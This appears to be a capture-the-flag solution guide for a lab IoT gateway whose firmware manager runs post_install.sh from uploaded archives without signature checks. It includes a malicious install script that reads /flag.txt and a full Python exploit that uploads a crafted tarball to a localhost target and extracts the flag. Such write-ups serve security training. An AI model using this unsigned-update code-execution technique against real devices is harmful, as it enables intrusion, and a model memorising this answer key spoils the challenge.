# A08 Medium: Solution Guide

### Vulnerability Analysis
1. Browse to `/settings/firmware` to discover the Firmware & OTA Package Manager.
2. The gateway accepts `.tar.gz` firmware archives via direct upload at `/api/v1/staging/upload` or pulls them from a configured repository mirror via `POST /api/v1/update/apply`.
3. The server untars the package and immediately executes `post_install.sh` without verifying digital signatures or file authenticity.

### Exploitation Steps
1. Create a malicious `post_install.sh` script:
   ```bash
   #!/bin/bash
   echo "FLAG_FOUND: $FLAG"
   cat /flag.txt 2>/dev/null || true
   ```
2. Compress `post_install.sh` into a tarball `package.tar.gz`.
3. Send a POST request to `/api/v1/staging/upload` with the malicious file attached.
4. Extract the dynamic flag from the response page or `/settings/logs`.

### Exploit Script
```python
import io
import tarfile
import requests
import re

BASE_URL = "http://127.0.0.1:6023"
s = requests.Session()

# 1. Build In-Memory Tarball
tar_stream = io.BytesIO()
with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
    script_data = b"#!/bin/bash\necho \"RETRIEVED_FLAG: $FLAG\"\n"
    ti = tarfile.TarInfo(name="post_install.sh")
    ti.size = len(script_data)
    ti.mode = 0o755
    tar.addfile(ti, io.BytesIO(script_data))

tar_stream.seek(0)

# 2. Upload and Deploy Package
resp = s.post(f"{BASE_URL}/api/v1/staging/upload", files={
    "firmware_file": ("package.tar.gz", tar_stream.getvalue(), "application/gzip")
}, allow_redirects=True)

# 3. Extract Flag
flag = re.search(r"RTSA\{[^}]+\}", resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
